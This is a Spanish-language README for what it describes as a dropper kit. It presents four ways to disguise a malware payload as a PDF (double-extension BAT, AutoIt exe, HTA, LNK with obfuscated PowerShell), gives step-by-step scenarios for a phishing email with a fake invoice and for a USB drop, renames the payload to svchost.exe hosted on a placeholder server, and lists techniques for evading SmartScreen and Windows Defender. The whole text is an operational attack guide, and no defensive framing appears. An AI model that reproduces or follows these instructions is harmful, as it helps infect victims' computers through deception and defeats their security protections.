# Dropper System - Social Engineering

Este directorio contiene componentes para crear un dropper realista que pase desapercibido.

## Estrategias Disponibles

### 1. BAT + PDF Decoy (Más Simple)
- **Archivo**: `ticket-de-compra.pdf.bat` (se ve como PDF en Explorer)
- **Funcionalidad**: Abre PDF legítimo + ejecuta payload en background
- **Ventajas**: Simple, funciona siempre, no necesita compilación
- **Desventajas**: AV puede detectar BAT sospechoso

### 2. AutoIt Dropper (Más Sofisticado)
- **Archivo**: `Factura_2024.exe` con icono PDF
- **Funcionalidad**: GUI falsa de PDF + payload injection
- **Ventajas**: Más convincente, icono personalizado, menos detección
- **Desventajas**: Requiere AutoIt o compilador

### 3. HTA + VBScript (Phishing Email)
- **Archivo**: `documento.hta`
- **Funcionalidad**: Página web que parece Word/PDF + descarga payload
- **Ventajas**: Excelente para phishing, muy sigiloso
- **Desventajas**: Requiere convencer al usuario de abrir HTA

### 4. LNK + PowerShell (Más Evasivo)
- **Archivo**: `Curriculum_Vitae.pdf.lnk` (shortcut que parece PDF)
- **Funcionalidad**: Ejecuta PowerShell ofuscado + abre PDF real
- **Ventajas**: Muy difícil de detectar, LNK menos sospechoso
- **Desventajas**: Requiere generación dinámica

## Archivos en este Directorio

- `simple_dropper.bat` - Dropper básico en BAT
- `advanced_dropper.ps1` - Dropper avanzado en PowerShell
- `generate_lnk.ps1` - Generador de LNK malicioso
- `decoy.pdf` - PDF falso para mostrar al usuario
- `builder.py` - Script Python para generar droppers personalizados

## Uso Recomendado

### Escenario 1: Email con Factura
```
1. Renombrar agent.exe a "svchost.exe"
2. Hostear en servidor web: http://tuservidor.com/update/svchost.exe
3. Usar simple_dropper.bat → renombrar a "Factura_Noviembre_2024.pdf.bat"
4. Incluir decoy.pdf (factura falsa real)
5. Enviar por email
```

### Escenario 2: USB Drop
```
1. Usar generate_lnk.ps1 para crear LNK con icono PDF
2. Incluir payload + PDF legítimo en USB
3. Dejar USB en lugares estratégicos
```

## Detección y Evasión

### Bypass de SmartScreen
- Firmar ejecutables (certificado code signing)
- Usar droppers interpretados (BAT/PS1) en vez de EXE
- Hosting en dominios legítimos (AWS, Azure, GCP)

### Bypass de Windows Defender
- Ofuscación de strings
- Delays antes de ejecutar payload
- Nombres de archivo realistas
- Evitar copiar archivos a system32 o carpetas sospechosas
